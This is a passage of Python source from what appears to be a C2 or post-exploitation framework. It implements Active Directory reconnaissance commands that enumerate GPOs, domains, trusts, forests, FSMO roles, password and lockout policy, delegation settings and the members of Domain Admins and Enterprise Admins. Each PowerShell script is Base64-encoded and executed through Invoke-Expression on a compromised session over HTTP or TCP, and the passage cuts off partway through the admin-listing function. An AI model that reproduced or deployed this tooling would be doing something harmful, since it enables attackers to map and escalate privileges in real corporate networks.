    if (Get-Command Get-GPO -ErrorAction SilentlyContinue) {{
        $outprop = (Get-GPO -Name '{name}' {server_arg} | Format-List *)
        if ($outprop) {{ Write-Output $outprop }}
        else {{ Write-Output "Nothing Found" }}
    }} else {{
        # LDAP fallback: search under CN=Policies,CN=System,<root>
        $ldapPath = "LDAP://CN=Policies,CN=System,$root"
        $searcher = New-Object System.DirectoryServices.DirectorySearcher
        $searcher.SearchRoot = [ADSI]"$ldapPath"
        $searcher.Filter = "(displayName={name})"
        $res = $searcher.FindOne()
        if ($res) {{
            foreach ($p in $res.Properties.PropertyNames) {{
                $v = $res.Properties[$p][0]
                if ($v) {{ Write-Output "$p`: $v" }}
                else {{ Write-Output "Nothing Found" }}
            }}
        }}
    }}
}} catch {{
    # retry LDAP fallback on error
    $ldapPath = "LDAP://CN=Policies,CN=System,$root"
    $searcher = New-Object System.DirectoryServices.DirectorySearcher
    $searcher.SearchRoot = [ADSI]"$ldapPath"
    $searcher.Filter     = "(displayName={name})"
    $res = $searcher.FindOne()
    if ($res) {{
        foreach ($p in $res.Properties.PropertyNames) {{
            $v = $res.Properties[$p][0]
            if ($v) {{ Write-Output "$p`: $v" }}
            else {{ Write-Output "Nothing Found" }}
        }}
    }}
}}
"""
    else:
        # list all GPO display names
        ps = f"""
{dns_preamble}
{root}
try {{
    if (Get-Command Get-GPO -ErrorAction SilentlyContinue) {{
        $outprop = (Get-GPO -All {server_arg} | Select-Object -ExpandProperty DisplayName)
        if ($outprop) {{ Write-Output $outprop }}
        else {{ Write-Output "Nothing Found" }}
    }} else {{
        $ldapPath = "LDAP://CN=Policies,CN=System,$root"
        $searcher = New-Object System.DirectoryServices.DirectorySearcher
        $searcher.SearchRoot = [ADSI]"$ldapPath"
        $searcher.PageSize = 1000
        $results = $searcher.FindAll()
        foreach ($r in $results) {{
            $n = $r.Properties["displayName"][0]
            if ($n) {{ Write-Output $n }}
            else {{ Write-Output "Nothing Found" }}
        }}
    }}
}} catch {{
    # retry LDAP fallback on error
    $ldapPath = "LDAP://CN=Policies,CN=System,$root"
    $searcher = New-Object System.DirectoryServices.DirectorySearcher
    $searcher.SearchRoot = [ADSI]"$ldapPath"
    $searcher.PageSize = 1000
    $results = $searcher.FindAll()
    foreach ($r in $results) {{
        $n = $r.Properties["displayName"][0]
        if ($n) {{ Write-Output $n }}
        else {{ Write-Output "Nothing Found" }}
    }}
}}
"""

    # Base64‑encode and dispatch
    b64 = base64.b64encode(ps.encode('utf-16le')).decode()
    one_liner = (
        "$ps = [System.Text.Encoding]::Unicode"
        f".GetString([Convert]::FromBase64String(\"{b64}\")); "
        "Invoke-Expression $ps"
    )

    if transport in ("http", "https"):
        out = shell.run_command_http(sid, one_liner)
    
    elif transport in ("tcp", "tls"):
        out = shell.run_command_tcp(sid, one_liner, timeout=0.5, portscan_active=True)

    else:
        return brightred + "[!] Unknown session transport!"


    if out:
        if "Nothing Found" in out:
            return brightred + "[!] Didn't find any OUs!"

        elif "Failed to resolve DC!" in out:
            return brightred + "[!] Failed to resolve DC, use --dc-ip or --domain with the correct IP/domain"

        else:
            return out

def getdomain(sid, domain=None, dc_ip=None):
    sess = session_manager.sessions.get(sid)
    if not sess:
        return brightred + "[!] Invalid session"
    transport = sess.transport.lower()

    target = dc_ip or domain or None

    if target:
        dns_preamble = connection_builder(dc_ip, domain)
        if dns_preamble == "ERROR":
            return brightred + "[!] Failed to resolve DC, use --dc-ip or --domain correctly"

        server_arg = "-Server $nb"
        root = "$ldapPath = \"LDAP://$nb\"; $root = ([ADSI] $ldapPath).defaultNamingContext"

    else:
        dns_preamble = ""
        server_arg   = ""
        root = "$root = ([ADSI]\"LDAP://RootDSE\").defaultNamingContext"

    ps = f"""
{dns_preamble}
try {{
  if (Get-Command Get-ADDomain -ErrorAction SilentlyContinue) {{
      $outprop = (Get-ADDomain {server_arg} | Format-List *)
      if ($outprop) {{ Write-Output $outprop }}
      else {{ Write-Output "Nothing Found" }}
  }} else {{
      # native LDAP fallback: bind to the domain naming context
      {root}
      $dom  = [ADSI]"LDAP://$root"
      foreach ($p in $dom.Properties.PropertyNames) {{
          $val = $dom.Properties[$p][0]
          if ($val) {{ Write-Output "$p`: $val" }}
          else {{ Write-Output "Nothing Found" }}
      }}
  }}
}} catch {{
  # On error, repeat the LDAP fallback
  {root}
  $dom  = [ADSI]"LDAP://$root"
  foreach ($p in $dom.Properties.PropertyNames) {{
      $val = $dom.Properties[$p][0]
      if ($val) {{ Write-Output "$p`: $val" }}
      else {{ Write-Output "Nothing Found" }}
  }}
}}
"""

    # encode & dispatch, just like your other commands
    b64 = base64.b64encode(ps.encode('utf-16le')).decode()
    one_liner = (
        "$ps = [System.Text.Encoding]::Unicode"
        f".GetString([Convert]::FromBase64String(\"{b64}\")); "
        "Invoke-Expression $ps"
    )

    if transport in ("http", "https"):
        out = shell.run_command_http(sid, one_liner)
    
    elif transport in ("tcp", "tls"):
        out = shell.run_command_tcp(sid, one_liner, timeout=0.5, portscan_active=True)

    if out:
        if "Nothing Found" in out:
            return brightred + "[!] Didn't find any OUs!"

        elif "Failed to resolve DC!" in out:
            return brightred + "[!] Failed to resolve DC, use --dc-ip or --domain with the correct IP/domain"

        else:
            return out

def gettrusts(sid, domain=None, dc_ip=None, name=None):
    """
    gettrusts [-d <domain>] [--dc-ip <ip>]
    - No flags: lists all trust relationships for the current domain.
    - With -d/--domain or --dc-ip: target that domain/DC.
    """
    sess = session_manager.sessions.get(sid)
    if not sess:
        return brightred + "[!] Invalid session"
    transport = sess.transport.lower()

    # decide which DC to target
    target = dc_ip or domain or None
    if target:
        dns_preamble = connection_builder(dc_ip, domain)
        if dns_preamble == "ERROR":
            return brightred + "[!] Failed to resolve DC, use --dc‑ip or --domain with the correct IP/domain"
        server_arg = "-Server $nb"
        root = "$ldapPath = \"LDAP://$nb\"; $root = ([ADSI] $ldapPath).defaultNamingContext"
    else:
        dns_preamble = ""
        server_arg   = ""
        root = "$root = ([ADSI]\"LDAP://RootDSE\").defaultNamingContext"

    # build the PS snippet
    if name:
        ps = f"""
{dns_preamble}
try {{
  if (Get-Command Get-ADTrust -ErrorAction SilentlyContinue) {{
      # AD module path
      $outprop = (Get-ADTrust -Identity '{name}' {server_arg} | Format-List *)
      if ($outprop) {{ Write-Output $outprop }}
      else {{ Write-Output "Nothing Found" }}
  }} else {{
      # LDAP fallback for a single trustedDomain
      {root}
      $searcher = New-Object System.DirectoryServices.DirectorySearcher(
          "LDAP://CN=System,$root",
          "(cn={name})"
      )
      $res = $searcher.FindOne()
      if ($res) {{
        foreach ($p in $res.Properties.PropertyNames) {{
          $v = $res.Properties[$p][0]
          if ($p) {{ Write-Output "$p`: $v" }}
          else {{ Write-Output "Nothing Found" }}
        }}
      }}
  }}
}} catch {{
  # on error, repeat LDAP fallback
  {root}
  $searcher = New-Object System.DirectoryServices.DirectorySearcher(
      "LDAP://CN=System,$root",
      "(cn={name})"
  )
  $res = $searcher.FindOne()
  if ($res) {{
    foreach ($p in $res.Properties.PropertyNames) {{
      $v = $res.Properties[$p][0]
      if ($p) {{ Write-Output "$p`: $v" }}
      else {{ Write-Output "Nothing Found" }}
    }}
  }}
}}
"""

    else:
        ps = f"""
{dns_preamble}
try {{
  if (Get-Command Get-ADTrust -ErrorAction SilentlyContinue) {{
      # use the AD module
      $outprop = (Get-ADTrust {server_arg} -Filter * | Select-Object Name,TrustType,Direction,TargetName)
      if ($outprop) {{ Write-Output $outprop }}
      else {{ Write-Output "Nothing Found" }}
  }} else {{
      # native LDAP fallback: look under CN=System for trustedDomain objects
      {root}
      $searcher = New-Object System.DirectoryServices.DirectorySearcher(
          "LDAP://CN=System,$root",
          "(objectClass=trustedDomain)"
      )
      $searcher.PageSize = 1000
      $results = $searcher.FindAll()
      foreach ($r in $results) {{
        $p    = $r.Properties
        $name = $p["cn"][0]
        $type = $p["trustType"][0]
        $dir  = $p["trustDirection"][0]

        if ($p["flatName"] -and $p["flatName"].Count -gt 0) {{
            $tgt = $p["flatName"][0]
        }} else {{
            $tgt = $name
        }}
        if ($p) {{ Write-Output ("{{0}} {{1}} {{2}} → {{3}}" -f $name, $type, $dir, $tgt) }}
        else {{ Write-Output "Nothing Found" }}
      }}
  }}
}} catch {{
  # on error, repeat the LDAP fallback
  {root}
  $searcher = New-Object System.DirectoryServices.DirectorySearcher(
      "LDAP://CN=System,$root",
      "(objectClass=trustedDomain)"
  )
  $searcher.PageSize = 1000
  $results = $searcher.FindAll()
  foreach ($r in $results) {{
    $p    = $r.Properties
    $name = $p["cn"][0]
    $type = $p["trustType"][0]
    $dir  = $p["trustDirection"][0]

    if ($p["flatName"] -and $p["flatName"].Count -gt 0) {{
            $tgt = $p["flatName"][0]
        }} else {{
            $tgt = $name
        }}

    if ($p) {{ Write-Output ("{{0}} {{1}} {{2}} → {{3}}" -f $name, $type, $dir, $tgt) }}
    else {{ Write-Output "Nothing Found" }}
  }}
}}
"""

    # UTF‑16LE + Base64 encode
    b64 = base64.b64encode(ps.encode('utf-16le')).decode()
    one_liner = (
        "$ps = [System.Text.Encoding]::Unicode"
        f".GetString([Convert]::FromBase64String(\"{b64}\")); "
        "Invoke-Expression $ps"
    )

    # dispatch to the agent
    if transport in ("http", "https"):
        out = shell.run_command_http(sid, one_liner)
    
    elif transport in ("tcp", "tls"):
        out = shell.run_command_tcp(sid, one_liner, timeout=0.5, portscan_active=True)

    else:
        return brightred + "[!] Unknown session transport!"

    # post‑process exactly like your other commands
    if out:
        if "Failed to resolve DC!" in out:
            return brightred + "[!] Failed to resolve DC, use --dc‑ip or --domain with the correct IP/domain"
        
        elif "Nothing Found" in out:
            return brightred + "[!] No trust relationships found!"

        else:
            return out

def getforest(sid, name=None, domain=None, dc_ip=None):
    """
    getforest [-n <name>] [-d <domain>] [--dc-ip <ip>]
    - No -n: lists all trusted-forest DNS names.
    - With -n: dumps every property (Name:Value) for that forest.
    - -d/--dc-ip: target a specific DC by name or IP.
    """
    sess = session_manager.sessions.get(sid)
    if not sess:
        return brightred + "[!] Invalid session"
    transport = sess.transport.lower()

    # pick target for SRV/DNS lookup
    target = dc_ip or domain or None

    if target:
        dns_preamble = connection_builder(dc_ip, domain)
        if dns_preamble == "ERROR":
            return brightred + "[!] Failed to resolve DC, use --dc-ip or --domain correctly"

        server_arg  = "-Server $nb"
        root_dom    = '$ldapPath = "LDAP://$nb"; $root = ([ADSI] $ldapPath).defaultNamingContext'
        root_forest = '$forestRoot = ([ADSI] "LDAP://$nb").configurationNamingContext'

    else:
        dns_preamble = ""
        server_arg  = ""
        root_dom    = '$root = ([ADSI]"LDAP://RootDSE").defaultNamingContext'
        root_forest = '$forestRoot = ([ADSI]"LDAP://RootDSE").configurationNamingContext'

    if name:
        # dump one forest’s properties
        ps = f"""
{dns_preamble}
{root_forest}
try {{
  if (Get-Command Get-ADForest -ErrorAction SilentlyContinue) {{
      $outprop = (Get-ADForest -Identity '{name}' {server_arg} -Properties * | Format-List *)
      if ($outprop) {{ Write-Output $outprop }}
      else {{ Write-Output "Nothing Found" }}
  }} else {{
      $forest = [ADSI]"LDAP://$forestRoot"
      foreach ($p in $forest.Properties.PropertyNames) {{
          $v = $forest.Properties[$p][0]
          if ($v) {{ Write-Output "$p`: $v" }}
          else {{ Write-Output "Nothing Found" }}
      }}
  }}
}} catch {{
  # retry LDAP fallback
  {root_forest}
  $forest = [ADSI]"LDAP://$forestRoot"
  foreach ($p in $forest.Properties.PropertyNames) {{
      $v = $forest.Properties[$p][0]
      if ($v) {{ Write-Output "$p`: $v" }}
      else {{ Write-Output "Nothing Found" }}
  }}
}}
"""
    else:
        # list all forests trusted by this domain
        ps = f"""
{dns_preamble}
{root_dom}
try {{
  if (Get-Command Get-ADTrust -ErrorAction SilentlyContinue) {{
      $outprop = (Get-ADTrust {server_arg} -Filter "TrustType -eq 'Forest'" | Select-Object -ExpandProperty TargetName)
      if ($outprop) {{ $found = $true; Write-Output $outprop }}
      else {{ Write-Output "Nothing Found" }}
  }} else {{
      $searcher = New-Object System.DirectoryServices.DirectorySearcher(
          "LDAP://$root","(objectClass=trustedDomain)"
      )
      $searcher.PageSize = 1000
      $results = $searcher.FindAll()
      foreach ($r in $results) {{
        $t = $r.Properties["trustType"][0]
        if ($t) {{
          if ($t -eq 3) {{
            $f = $r.Properties["flatName"][0]
            if (-not $f) {{ $f = $r.Properties["cn"][0] }}
            if ($f) {{ $found = $true; Write-Output $f }}
            else {{ Write-Output "Nothing Found" }}
          }}
        }} else {{ Write-Output "Nothing Found" }}
    }}
  }}
}} catch {{
  # retry LDAP fallback
  {root_dom}
  $searcher = New-Object System.DirectoryServices.DirectorySearcher(
      "LDAP://$root","(objectClass=trustedDomain)"
  )
  $searcher.PageSize = 1000
  $results = $searcher.FindAll()
  foreach ($r in $results) {{
    $t = $r.Properties["trustType"][0]
    if ($t) {{
      if ($t -eq 3) {{
        $f = $r.Properties["flatName"][0]
        if (-not $f) {{ $f = $r.Properties["cn"][0] }}
        if ($f) {{ $found = $true; Write-Output $f }}
        else {{ Write-Output "Nothing Found" }}
      }}
    }} else {{ Write-Output "Nothing Found" }}
  }}
}}

if (-not $found) {{ Write-Output "Nothing Found" }}
"""
    # encode & dispatch
    b64 = base64.b64encode(ps.encode('utf-16le')).decode()
    one_liner = (
        "$ps = [System.Text.Encoding]::Unicode"
        f".GetString([Convert]::FromBase64String(\"{b64}\")); Invoke-Expression $ps"
    )
    if transport in ("http", "https"):
        out = shell.run_command_http(sid, one_liner)
    
    elif transport in ("tcp", "tls"):
        out = shell.run_command_tcp(sid, one_liner, timeout=0.5, portscan_active=True)

    else:
        return brightred + "[!] Unknown session transport!"

    if out:
        if "Failed to resolve DC!" in out:
            return brightred + "[!] Failed to resolve DC, use --dc‑ip or --domain with the correct IP/domain"
        
        elif "Nothing Found" in out:
            return brightred + "[!] No trust relationships found!"

        else:
            return out

def getfsmo(sid, domain=None, dc_ip=None):
    """
    getfsmo [-d <domain>] [--dc-ip <ip>]
    - No flags: shows the forest‑level FSMO role holders (SchemaMaster, DomainNamingMaster).
    - -d, --domain: shows the domain‑level FSMO role holders (PDCEmulator, RIDMaster, InfrastructureMaster).
    - --dc-ip:     target a specific DC by IP (falls back to DNS → NetBIOS).
    """
    sess = session_manager.sessions.get(sid)
    if not sess:
        return brightred + "[!] Invalid session"
    transport = sess.transport.lower()

    # pick a DC to talk to
    target = dc_ip or domain or None
    if target:
        dns_preamble = connection_builder(dc_ip, domain)
        if dns_preamble == "ERROR":
            return brightred + "[!] Failed to resolve DC, use --dc-ip or --domain correctly"
        server_arg = "-Server $nb"
    else:
        dns_preamble = ""
        server_arg   = ""

    # forest‑level vs domain‑level
    if domain or dc_ip:
        # domain‑level FSMO
        ps = f"""
{dns_preamble}
try {{
  if (Get-Command Get-ADDomain -ErrorAction SilentlyContinue) {{
      # AD module
      $outprop = (Get-ADDomain {server_arg} | Select-Object PDCEmulator,RIDMaster,InfrastructureMaster |
        Format-Table -AutoSize)
      if ($outprop) {{ Write-Output $outprop }}
      else {{ Write-Output "Nothing Found" }}
  }} else {{
      # native LDAP fallback: read fSMORoleOwner from the domain NC head
      $rootDSE = [ADSI]"LDAP://RootDSE"
      $dn = $rootDSE.defaultNamingContext
      $dom = [ADSI]"LDAP://$dn"
      if ($dom) {{
        Write-Output ("PDCEmulator: "       + $dom.Properties["fSMORoleOwner"][0])
        Write-Output ("RIDMaster: "         + $dom.Properties["fSMORoleOwner"][1])
        Write-Output ("InfrastructureMaster: " + $dom.Properties["fSMORoleOwner"][2])
      }} else {{ Write-Output "Nothing Found" }}
  }}
}} catch {{
  # on error, repeat native LDAP fallback
  $rootDSE = [ADSI]"LDAP://RootDSE"
  $dn = $rootDSE.defaultNamingContext
  $dom = [ADSI]"LDAP://$dn"
  if ($dom) {{
    Write-Output ("PDCEmulator: "       + $dom.Properties["fSMORoleOwner"][0])
    Write-Output ("RIDMaster: "         + $dom.Properties["fSMORoleOwner"][1])
    Write-Output ("InfrastructureMaster: " + $dom.Properties["fSMORoleOwner"][2])
  }} else {{ Write-Output "Nothing Found" }}
}}
"""
    else:
        # forest‑level FSMO
        ps = f"""
{dns_preamble}
try {{
  if (Get-Command Get-ADForest -ErrorAction SilentlyContinue) {{
      # AD module
      $outprop = (Get-ADForest {server_arg} | Select-Object SchemaMaster,DomainNamingMaster |
        Format-Table -AutoSize)
      if ($outprop) {{ Write-Output $outprop }}
      else {{ Write-Output "Nothing Found" }}
  }} else {{
      # native LDAP fallback: read fSMORoleOwner from each NC head
      $rootDSE = [ADSI]"LDAP://RootDSE"
      $schemaNC = $rootDSE.schemaNamingContext
      $configNC = $rootDSE.configurationNamingContext
      $schema = [ADSI]"LDAP://$schemaNC"
      $config = [ADSI]"LDAP://$configNC"
      if ($config -and $schema) {{
        Write-Output ("SchemaMaster: "        + $schema.Properties["fSMORoleOwner"][0])
        Write-Output ("DomainNamingMaster: " + $config.Properties["fSMORoleOwner"][0]) 
      }} else {{ Write-Output "Nothing Found" }}   
  }}
}} catch {{
  # on error, repeat native LDAP fallback
  $rootDSE = [ADSI]"LDAP://RootDSE"
  $schemaNC = $rootDSE.schemaNamingContext
  $configNC = $rootDSE.configurationNamingContext
  $schema = [ADSI]"LDAP://$schemaNC"
  $config = [ADSI]"LDAP://$configNC"
  if ($config -and $schema) {{
    Write-Output ("SchemaMaster: "        + $schema.Properties["fSMORoleOwner"][0])
    Write-Output ("DomainNamingMaster: " + $config.Properties["fSMORoleOwner"][0]) 
  }} else {{ Write-Output "Nothing Found" }}
}}
"""

    # Base64‑encode & dispatch
    b64 = base64.b64encode(ps.encode('utf-16le')).decode()
    one_liner = (
        "$ps = [System.Text.Encoding]::Unicode"
        f".GetString([Convert]::FromBase64String(\"{b64}\")); "
        "Invoke-Expression $ps"
    )

    if transport in ("http", "https"):
        out = shell.run_command_http(sid, one_liner)
    
    elif transport in ("tcp", "tls"):
        out = shell.run_command_tcp(sid, one_liner, timeout=0.5, portscan_active=True)

    else:
        return brightred + "[!] Unknown session transport!"

    if out:
        if "Failed to resolve DC!" in out:
            return brightred + "[!] Failed to resolve DC, use --dc‑ip or --domain with the correct IP/domain"
        
        elif "Nothing Found" in out:
            return brightred + "[!] No trust relationships found!"

        else:
            return out

def getdomainpolicy(sid, domain=None, dc_ip=None):
    """
    getdomainpolicy [-d <domain>] [--dc-ip <ip>]
    - No flags: dumps the current domain’s PasswordPolicy, LockoutPolicy and KerberosPolicy.
    - -d/--domain: target that AD domain.
    - --dc-ip:     target that DC by IP (falls back to DNS→NetBIOS).
    """
    sess = session_manager.sessions.get(sid)
    if not sess:
        return brightred + "[!] Invalid session"
    transport = sess.transport.lower()

    # build the PowerShell snippet
    target = dc_ip or domain or None
    if target:
        dns_preamble = connection_builder(dc_ip, domain)

        if dns_preamble == "ERROR":
            return brightred + "[!] Failed to resolve DC, use --dc-ip or --domain correctly"

        server_arg = "-Server $nb"
        root    = '$ldapPath = "LDAP://$nb"; $root = ([ADSI] $ldapPath).defaultNamingContext'
        pol = f"$policy = (Get-ADDefaultDomainPasswordPolicy {server_arg} -ErrorAction SilentlyContinue | Format-List *)"
        lock = f"$lockout = (Get-ADDefaultDomainLockoutPolicy {server_arg} -ErrorAction SilentlyContinue | Format-List *)"
        ker = f"$kerpol = (Get-ADKerberosPolicy {server_arg} -ErrorAction SilentlyContinue | Format-List *)"
    else:
        dns_preamble = ""
        server_arg   = None
        root = '$root = ([ADSI]"LDAP://RootDSE").defaultNamingContext'
        pol = "$policy = (Get-ADDefaultDomainPasswordPolicy -ErrorAction SilentlyContinue | Format-List *)"
        lock = "$lockout = (Get-ADDefaultDomainLockoutPolicy -ErrorAction SilentlyContinue | Format-List *)"
        ker = "$kerpol = (Get-ADKerberosPolicy -ErrorAction SilentlyContinue | Format-List *)"

    ps = f"""
{dns_preamble}
try {{
    if (Get-Command Get-ADDefaultDomainPasswordPolicy -ErrorAction SilentlyContinue) {{
        {pol}

        if (Get-Command Get-ADDefaultDomainLockoutPolicy -ErrorAction SilentlyContinue) {{
          {lock}
        }} else {{ $lockout = $false }}

        if (Get-Command Get-ADKerberosPolicy -ErrorAction SilentlyContinue) {{
          {ker}
        }} else {{ $kerpol = $false }}

        if ((-not $policy) -and (-not $lockout) -and (-not $kerpol)) {{ Write-Output "Nothing Found" }}

        if (($policy) -or ($lockout) -or ($kerpol)) {{
          if ($policy) {{
            Write-Output '=== Password Policy ==='
            Write-Output $policy
          }}
          if ($lockout) {{
            Write-Output '\n=== Lockout Policy ==='
            Write-Output $lockout
          }}
          if ($kerpol) {{
            Write-Output '\n=== Kerberos Policy ==='
            Write-Output $kerpol
          }}
        }}
    }} else {{
        # Native LDAP fallback: read policy attributes from domain object
        {root}
        $dom = [ADSI]"LDAP://$root"
        if ($dom) {{
            $li = $dom.Properties['maxPwdAge'][0]
            $rawpwmax = ([uint64]$li.HighPart -shl 32) -bor [uint32]$li.LowPart
            foreach ($prop in 'maxPwdAge','minPwdAge','lockoutDuration','lockoutObservationWindow','msDS-MaxTicketAge','msDS-MaxRenewAge','msDS-MaxServiceTicketAge') {{
              $li = $dom.Properties[$prop][0]
              if ($li -is [__ComObject]) {{
                $raw  = ([uint64]$li.HighPart -shl 32) -bor [uint32]$li.LowPart
                $ts   = [TimeSpan]::FromTicks($raw)
                Write-Output (“{{0,-25}} {{1}}” -f $prop, $ts)
              }} else {{
                  Write-Output (“{{0,-25}} {{1}}” -f $prop, $li)
              }}
            }}
            Write-Output ("MinPwdLength: "           + $dom.Properties["minPwdLength"][0])
            Write-Output ("LockoutThreshold: "       + $dom.Properties["lockoutThreshold"][0])
            # Kerberos fallback values, if available
        }} else {{
            Write-Output "Nothing Found"
        }}
    }}
}} catch {{
    # On error, repeat native LDAP fallback
    {root}
    $dom = [ADSI]"LDAP://$root"
    if ($dom) {{
        $li = $dom.Properties['maxPwdAge'][0]
        $rawpwmax = ([uint64]$li.HighPart -shl 32) -bor [uint32]$li.LowPart
        foreach ($prop in 'maxPwdAge','minPwdAge','lockoutDuration','lockoutObservationWindow','msDS-MaxTicketAge','msDS-MaxRenewAge','msDS-MaxServiceTicketAge') {{
            $li = $dom.Properties[$prop][0]
            if ($li -is [__ComObject]) {{
              $raw  = ([uint64]$li.HighPart -shl 32) -bor [uint32]$li.LowPart
              $ts   = [TimeSpan]::FromTicks($raw)
              Write-Output (“{{0,-25}} {{1}}” -f $prop, $ts)
            }} else {{
                Write-Output (“{{0,-25}} {{1}}” -f $prop, $li)
            }}
        }}
        Write-Output ("MinPwdLength: "           + $dom.Properties["minPwdLength"][0])
        Write-Output ("LockoutThreshold: "       + $dom.Properties["lockoutThreshold"][0])
        # Kerberos fallback values, if available
    }} else {{
        Write-Output "Nothing Found"
    }}
}}
"""

    b64 = base64.b64encode(ps.encode('utf-16le')).decode()
    one_liner = (
      "$ps = [System.Text.Encoding]::Unicode"
      f".GetString([Convert]::FromBase64String(\"{b64}\")); Invoke-Expression $ps"
    )

    if transport in ("http", "https"):
        out = shell.run_command_http(sid, one_liner)
    
    elif transport in ("tcp", "tls"):
        out = shell.run_command_tcp(sid, one_liner, timeout=0.5, portscan_active=True)

    else:
        return brightred + "[!] Unknown session transport!"

    if out:
        if "Failed to resolve DC!" in out:
            return brightred + "[!] Failed to resolve DC, use --dc‑ip or --domain with the correct IP/domain"
        
        elif "Nothing Found" in out:
            return brightred + "[!] No password policy found!"

        else:
            return out

def getdelegation(sid, domain=None, dc_ip=None):
    """
    getdelegation [-d <domain>] [--dc-ip <ip>]
    List all objects (users, computers, service accounts) with unconstrained
    or constrained delegation enabled.
    """
    sess = session_manager.sessions.get(sid)
    if not sess:
        return brightred + "[!] Invalid session"
    transport = sess.transport.lower()

    target = dc_ip or domain or None
    if target:
        dns_preamble = connection_builder(dc_ip, domain)
        if dns_preamble == "ERROR":
            return brightred + "[!] Failed to resolve DC, use --dc-ip or --domain correctly"

        server_arg = "-Server $nb"
        root    = '$ldapPath = "LDAP://$nb"; $root = ([ADSI] $ldapPath).defaultNamingContext'
        unconst = f'$uncon = (Get-ADObject -Filter {{ userAccountControl -band 0x80000 }} {server_arg})'
        const = f'$con = (Get-ADObject -LDAPFilter "(msDS-AllowedToDelegateTo=*)" {server_arg} -Properties msDS-AllowedToDelegateTo)'

    else:
        dns_preamble = ""
        server_arg   = ""
        root = '$root = ([ADSI]"LDAP://RootDSE").defaultNamingContext'
        unconst = f'$uncon = (Get-ADObject -Filter {{ userAccountControl -band 0x80000 }})'
        const = f'$con = (Get-ADObject -LDAPFilter "(msDS-AllowedToDelegateTo=*)" -Properties msDS-AllowedToDelegateTo)'

    ps = f"""
{dns_preamble}

try {{
  if (Get-Command Get-ADObject -ErrorAction SilentlyContinue) {{
      {unconst}
      
      {const}
      
      if ($con) {{ $svc = $con.Properties['msDS-AllowedToDelegateTo'] -join ',' }}
      if (($uncon) -or ($con)) {{
        if ($uncon) {{
          foreach ($r in $uncon.Name) {{
            Write-Output "Unconstrained delegation: $r"
          }}
        }}
        
        if ($con) {{
          foreach ($r in $con.Name) {{
            Write-Output "Constrained delegation: $r -> $svc"
          }}
        }}
      }}
  }}
  else {{
      {root}
      $searcher = New-Object System.DirectoryServices.DirectorySearcher("LDAP://$root", "(userAccountControl:1.2.840.113556.1.4.803:=8192)")
      $searcher.PageSize = 1000
      $results = $searcher.FindAll()
      foreach ($r in $results) {{
          $n = $r.Properties['cn'][0]
          if ($n) {{
            Write-Output "Unconstrained delegation: $n"
          }} else {{ Write-Output "Nothing Found" }}
      }}
      
      $searcher = New-Object System.DirectoryServices.DirectorySearcher("LDAP://$root", "(msDS-AllowedToDelegateTo=*)")
      $searcher.PageSize = 1000
      $results = $searcher.FindAll()
      foreach ($r in $results) {{
          $n        = $r.Properties['cn'][0]
          $services = $r.Properties['msDS-AllowedToDelegateTo'] -join ','
          if (($n) -and ($services)) {{ Write-Output "constrained delegation: $n -> $services" }}
          else {{ Write-Output "Nothing Found" }}
      }}
  }}
}} catch {{
    {root}
      
      $searcher = New-Object System.DirectoryServices.DirectorySearcher("LDAP://$root", "(userAccountControl:1.2.840.113556.1.4.803:=8192)")
      $searcher.PageSize = 1000
      $results = $searcher.FindAll()
      foreach ($r in $results) {{
          $n = $r.Properties['cn'][0]
          if ($n) {{
            Write-Output "Unconstrained delegation: $n"
          }} else {{ Write-Output "Nothing Found" }}
      }}

      $searcher = New-Object System.DirectoryServices.DirectorySearcher("LDAP://$root", "(msDS-AllowedToDelegateTo=*)")
      $searcher.PageSize = 1000
      $results = $searcher.FindAll()
      foreach ($r in $results) {{
          $n        = $r.Properties['cn'][0]
          $services = $r.Properties['msDS-AllowedToDelegateTo'] -join ','
          if (($n) -and ($services)) {{ Write-Output "constrained delegation: $n -> $services" }}
          else {{ Write-Output "Nothing Found" }}
      }}
  }}
"""

    b64 = base64.b64encode(ps.encode('utf-16le')).decode()
    one_liner = (
      "$ps = [System.Text.Encoding]::Unicode"
      f".GetString([Convert]::FromBase64String(\"{b64}\")); Invoke-Expression $ps"
    )

    if transport in ("http", "https"):
        out = shell.run_command_http(sid, one_liner)
    
    elif transport in ("tcp", "tls"):
        out = shell.run_command_tcp(sid, one_liner, timeout=0.5, portscan_active=True)

    else:
        return brightred + "[!] Unknown session transport!"

    if out:
        if "Failed to resolve DC!" in out:
            return brightred + "[!] Failed to resolve DC, use --dc‑ip or --domain with the correct IP/domain"
        
        elif "Nothing Found" in out:
            return brightred + "[!] No constrained or unconstrained delegation found!"

        else:
            return out

def getadmins(sid, domain=None, dc_ip=None):
    """
    getadmins [-d <domain>] [--dc-ip <ip>]
    - No flags: list members of "Domain Admins" and "Enterprise Admins" in the current domain.
    - -d, --domain: target a specific AD domain.
    - --dc-ip:      target a specific DC by IP.
    """
    sess = session_manager.sessions.get(sid)
    if not sess:
        return brightred + "[!] Invalid session"
    transport = sess.transport.lower()

    # build DC-resolution preamble exactly like your other commands
    target = dc_ip or domain or None
    if target:
        dns_preamble = connection_builder(dc_ip, domain)
        if dns_preamble == "ERROR":
            return brightred + "[!] Failed to resolve DC, use --dc-ip or --domain correctly"
        server_arg = "-Server $nb"
        root       = "$ldapPath = \"LDAP://$nb\"; $root = ([ADSI] $ldapPath).defaultNamingContext"
        dom_admins = f"$domainAdmins = (Get-ADGroupMember -Identity \"Domain Admins\" {server_arg} | Select-Object -ExpandProperty SamAccountName)"
        enter_admins = f"$enterpriseAdmins = (Get-ADGroupMember -Identity \"Enterprise Admins\" {server_arg} | Select-Object -ExpandProperty SamAccountName)"

    else:
        dns_preamble = ""
        server_arg   = ""
        root         = "$root = ([ADSI]\"LDAP://RootDSE\").defaultNamingContext"
        dom_admins = f"$domainAdmins = (Get-ADGroupMember -Identity \"Domain Admins\" | Select-Object -ExpandProperty SamAccountName)"
        enter_admins = f"$enterpriseAdmins = (Get-ADGroupMember -Identity \"Enterprise Admins\" | Select-Object -ExpandProperty SamAccountName)"

    # PowerShell snippet
    ps = f"""
{dns_preamble}
try {{
  if (Get-Command Get-ADGroupMember -ErrorAction SilentlyContinue) {{
      {dom_admins}
      {enter_admins}

      if (($domainAdmins) -or ($enterpriseAdmins)) {{
        if ($domainAdmins) {{
          Write-Output "====Domain Admins===="
          Write-Output $domainAdmins
          Write-Output "\n"
        }}

        if ($enterpriseAdmins) {{
          Write-Output "====Enterprise Admins===="
          Write-Output $enterpriseAdmins
          Write-Output "\n"
        }}
      }}

        if ((-not $domainAdmins) -and (-not $enterpriseAdmins)) {{ Write-Output "Nothing Found" }}

  }} else {{
      {root}
      # LDAP fallback: grab the 'member' DNs then resolve each to samAccountName
      $searcher = New-Object System.DirectoryServices.DirectorySearcher("LDAP://$root","(CN=Domain Admins)")
